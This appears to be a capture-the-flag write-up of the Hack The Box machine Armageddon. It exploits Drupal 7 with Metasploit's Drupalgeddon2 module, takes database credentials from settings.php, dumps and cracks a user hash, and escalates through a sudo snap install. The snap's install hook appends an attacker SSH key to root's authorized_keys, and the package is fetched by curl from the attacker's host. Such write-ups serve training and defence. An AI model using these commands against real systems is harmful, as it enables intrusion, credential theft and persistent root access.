--- 
title: "Hack the Box (HTB) - Armageddon"
description: "Drupal exploit & Snap SUID"
date: 2024-08-18 12:00:00 -100
image: /assets/images/HTB - Armageddon/Armageddon Thumbnail.jpg
categories: [CTF]
tags: [drupal, suid, snap,snapd]    # TAG names should always be lowercase
---

## Enumeration

We'll run our [AutoRecon](https://github.com/Tib3rius/AutoRecon) scan against our target at `10.10.10.233`

We see the following ports open:

| Port | Service | Version                        |
|------|---------|--------------------------------|
| 22/tcp  | SSH     | OpenSSH 7.4 (protocol 2.0)     |
| 80/tcp | HTTP    | Apache httpd 2.4.6 (CentOS) PHP/5.4.16 |

There are various UDP ports open, but let's investigate the obvious path first and check out the Apache web server

![Login Page](/assets/images/HTB%20-%20Armageddon/Login%20Page.png)

We see a juicy login page, and our Wappalyzer states the website is using `Drupal 7`

Drupal is a open source CMS, which is software that allows users to create, manage, and organize digital content for websites. Drupal 7 is somewhat vague but doing some research tells me that Drupal 7 was released in `2011` so there's definitely an exploit for it

Googling exploits for Drupal 7 leads us to the following [exploit DB](https://www.exploit-db.com/exploits/44449) article

![Drupal Exploit](/assets/images/HTB%20-%20Armageddon/Exploit%20DB%20Armageddon.png)

This script takes advantage of [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/cve-2018-7600) in which Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allow remote attackers to execute arbitrary code.

We can find ths `drupalgeddon` exploit in Metasploit

```bash
msfdb
```

### Explaining the form vulnerability further

This module we're about to use in MSF is called `drupal_drupalgeddon2` and it exploits a vulnerability in Drupal's Forms API which allows attackers to inject arbitrary PHP code. The Forms API does not validate input and is the cause for the exploit

![Forms.inc](/assets/images/HTB%20-%20Armageddon/Forms%20inc.png)

This is the file that contains the API functionality

Searching for `drupalgeddon` in MSF shows us the following

![MSF Drupal](/assets/images/HTB%20-%20Armageddon/MSF%20Drupal.png)

Now we just set our `rhost` & `lhost` option and fire away

![Meterpreter](/assets/images/HTB%20-%20Armageddon/Meterpreter.png)

Our Meterpreter shell is live. Meterpreter is a specialized in memory shell provided by MSF. This specific shell has it's own set of commands which are different from the native OS commands.

We can type `shell` Meterpreter will drop us into the target system's native command shell

![Meterpreter to Shell](/assets/images/HTB%20-%20Armageddon/Meteter%20to%20Shell.png)

Doing a quick search for Drupal tells me to look for a `settings.php` or `default.settings.php`

![Password Discovered](/assets/images/HTB%20-%20Armageddon/Password%20Discvoered.png)

We find a settings.php with the password `CQHEy@9M*m23gBVj`

This isn't the best way to scan through the file for a password, as I'm not sure who the user is. Let's do a similar command that will give us 5 lines before and after the keyword we're looking for

```bash
grep -C 5 'pass' settings.php
```

![More Info](/assets/images/HTB%20-%20Armageddon/More%20Info.png)

Ah, now we have the DB name `drupal` with the username `drupaluser` for the password mentioned above

Let's dive into the MySQL DB and explore for sensitive information. Since this isn't a fully interactive shell, we must do it line by line

```bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'
```

The above command shows the `drupal` database that was shown to us earlier in the config file

Let's extend our commamnd to use the database and show the tables

```bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; show tables;'
```

We see a users table from this command, now let's select all from the users table

```bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; SELECT * FROM users;'
```

This syntax shows somewhat garbled, but readable output. I will put this in a neat bullets for documentation purposes

- Username: brucetherealadmin
- Password (hashed): $$$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.o0Suf1xAhaadURt
- Email: admin@armageddon.eu

In order to check this with hashcat we need to know the mode.

```bash
hashcat -h | grep -i drupal
```

![Hashcat Mode](/assets/images/HTB%20-%20Armageddon/Hashcat%20Module.png)

Looks like it's `7900`. Let's run hashcat aganist this hash

```bash
hashcat -m 7900 -a 0 '$$$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.o0Suf1xAhaadURt' /usr/share/wordlists/rockyou.txt
```

![Cracked](/assets/images/HTB%20-%20Armageddon/Cracked.png)

We get the password `booboo` for brucetherealadmin. Let's try to SSH as bruce

```bash
ssh brucetherealadmin@10.10.10.233
```

![Bruce](/assets/images/HTB%20-%20Armageddon/Bruce.png)

Now that we have user on this system, let's so some foothold enumeration



 **Category**                      | **Command**                                      | **Result**                                       |
|-----------------------------------|--------------------------------------------------|--------------------------------------------------|
| **Current User & Group Perms (ID)** | `id`                                            | uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 |
| **Kernel Version**                | `uname -r`                                      | 3.10.0-1160.6.1.el7.x86_64|
| **SUDO Permissions**              | `sudo -l`                                       | (root) NOPASSWD: /usr/bin/snap install *|
| **SUID Binaries**            | `find / -perm 4000 2>/dev/null`                  | Nothing                                      |
| **Services Running as Root**      | `netstat -antup`      | 127.0.0.1:25            0.0.0.0:*                           |
| **Cron Jobs**                     | `ls -la /etc/cron.d`<br>`find / -perm -2 -type f 2>/dev/null` | Nothing noteworthy                           |
| **PATH**                          | `echo $PATH`                                    | /usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/var/lib/snapd/snap/bin:/home/brucetherealadmin/.local/bin:/home/brucetherealadmin/bin

As always, let's go for the low hanging fruit first. We are allowed to run `/usr/bin/snap install *` as root with no password. This means we can install ANY snap package from the snap store or local snap file

Snap is a package management system that's similar to docker, and "snaps" are basically self contained software packages that include all the dependencies needed to run the app


Checking GTFO bins for snap we see the following
![GTFO Snap](/assets/images/HTB%20-%20Armageddon/Snap%20GTFO.png)

When we create a snap package, you can include hooks (scripts that execute during the lifecycle of a snap package) that run specific commands during installation. These hooks will execute with root privileges since we can run it with sudo

GTFO bins provides us with the syntax to generate a malicious snap. 

We'll also need the [FPM](https://github.com/jordansissel/fpm) to package this into a snap package

We will use this to simply add our public key to root's SSH configuration file. First let'e generate the key pair

```bash
ssh-keygen -t rsa -b 4096 -f /tmp/my_key
```

![Public Key](/assets/images/HTB%20-%20Armageddon/SSH%20Public%20Key.png)


```bash
# We have to edit the COMMAND part from GTFO bins to add our public key

COMMAND='mkdir -p /root/.ssh; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCDI3EdD9gFZGYtJsJErp2NXtLomP0mTmCo+yVCItqJHoBzn7Wcw5+9DmOe/S03X5hFF2pN0SIny1iZWnHtklwjabGBV7kA4TiIAlQRKpqsf5qFaVDUYPA6yNhd3xJPZrHWFTAF6alK9S+WBUm54fdvvi9zjaS2XVGETrZKVIi7QDX2nCBI/ch5D0exJks8mNBkt+xpwChzo1/Jy3j8VHiReuXvSfCC86bIdL1VwQ9MXhHQvQVGeSMWWlX6XEObukEF9Ap/ZCh4vqa9sS5GJkMorK4HhusIpR3WZ5Z/rILGPPxUNOme2tHkkkM3JaC9as76tgkGfOM70lr/4ApQWR5h7JK+6joisJ59eblDdNTo0z4jIOQyNwJwTtt8zHIP7dIe9YzhFPk5wWxzqP8J2x5VvG5z3f7SKa91IG+dm1dyg4ggizp0AfUvU/QhbTOjxC5bBwBDocRFQzQBZgweBbkgbLBLPIhPMQFKdM1wqfHRoRUq+CcPbSf8IOxzMWjVqeTZrvasxZCoXpZ6tZv9Q8XzvP1jxLWXIhaw32tnuRNCFJk+5/Wi5sU1IODMrtBlH0Q4/9KycCTMoYm+nUBKixTSiSPctV4XL9ysoUz55hzIrTcTAmn2O1ZzHwh6e4dxESdMQeqjPEfCvpccK8Iu4L3gGWCc5Ium85KlitgUJys5pQ==" >> /root/.ssh/authorized_keys'
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
```

Transfer the snap over to the victim

```bash
# Our Machine
python3 -m http.server 9001

# Victim Machine
curl http://<your-IP><PORT>/xxxx_1.0_all.snap -o pwned.snap
```

Now we have our malicious snap `pwned.snap` Now let's install the custom snap package

```bash
sudo snap install pwned.snap --dangerous --devmode
```

- --dangerous = Run the package even if it's not from trusted source
- --devmode = Install a snap package in development mode, which bypasses snaps sandbox restrictions

![Error2](/assets/images/HTB%20-%20Armageddon/Error%202.png)

![Root](/assets/images/HTB%20-%20Armageddon/Root%20Armageddon.png)

GG, we've rooted Armageddon!

### Failed Escalation Attempt

Googling "snap exploit" leads me to this [Github Repo](https://github.com/initstring/dirty_sock) which explains [CVE-2019-7304](https://nvd.nist.gov/vuln/detail/CVE-2019-7304) stating that a bug in the snapd API leads to privilege escalation

We will be focusing our efforts on the `dirty_sockv2` exploit as it doesn't require Internet

This exploit allows a non-privileged user to gain root access by manipulating the UID check within the `snapd` service

Let's grab this repo on our attcker machine

```bash
git clone https://github.com/initstring/dirty_sock.git
```

And it's patched, lol

![Patched](/assets/images/HTB%20-%20Armageddon/Patched.png)


We can check if our system is vulnerable by running `snap version`. If it's lower than 2.37.1 we can exploit this

```bash
snap version
```

![Version](/assets/images/HTB%20-%20Armageddon/Snap%20Version.png)


### Brute Force SSH (Alternative to navigating the database earlier)

![Brute Force SSH](/assets/images/HTB%20-%20Armageddon/Brute%20force%20SSH.png)

We could have simply brute forced SSH here as well to get the password

## Vulnerabilities & Mitigations

## Vulnerabilities & Mitigations

| **Vulnerability**                                | **Mitigation**                                                                                     |
|--------------------------------------------------|----------------------------------------------------------------------------------------------------|
| **Drupalgeddon 2 (CVE-2018-7600)**               | Update Drupal to a patched version. For Drupal 7.x, upgrade to 7.58 or later. For Drupal 8.x, upgrade to 8.5.1 or later. Apply security patches provided by Drupal. |
| **Snap Package Privilege Escalation**            | Ensure snapd is updated to the latest version. For CVE-2019-7304, ensure snapd version is 2.37.1 or higher. Regularly review and update package management tools. |

### Remediation References

- [Drupal Security Advisories](https://www.drupal.org/security)
- [Snapd Security Updates](https://snapcraft.io/docs/security-updates)
